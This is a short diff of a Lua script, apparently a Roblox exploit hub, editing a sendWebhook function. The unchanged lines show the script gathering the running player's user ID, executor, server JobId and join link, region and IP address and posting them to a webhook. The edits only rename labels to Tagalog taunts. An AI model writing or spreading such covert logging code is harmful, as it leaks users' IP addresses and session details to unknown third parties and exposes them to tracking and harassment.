@@ -102,10 +102,10 @@ _G.__KUNI_LOGGED = true
 --==================================================
 local function sendWebhook()
     local data = {
-        username = HUB_NAME .. " Logger",
+        username = HUB_NAME .. " asham",
         avatar_url = "https://i.imgur.com/4M34hi2.png",
         embeds = {{
-            title = "🚀 BOBO TO",
+            title = "🚀 PALDO GAGO",
             color = EMBED_COLOR,
             thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=420&height=420&format=png"},
             fields = {
@@ -114,7 +114,7 @@ local function sendWebhook()
                 {name = "🖥️ Session", value = "**Executor:** " .. EXECUTOR .. "\n**JobId:** [" .. _G.RealJobID .. "](" .. JOIN_LINK .. ")", inline = false},
                 {name = "🌍 Network", value = "**Region:** " .. REGION .. "\n**IP:** " .. IP_ADDRESS, inline = false}
             },
-            footer = {text = HUB_NAME .. " • SYNTAX ON TOP"},
+            footer = {text = HUB_NAME .. " • ASHAM ON TOP"},
             timestamp = DateTime.now():ToIsoDate()
         }}
     }
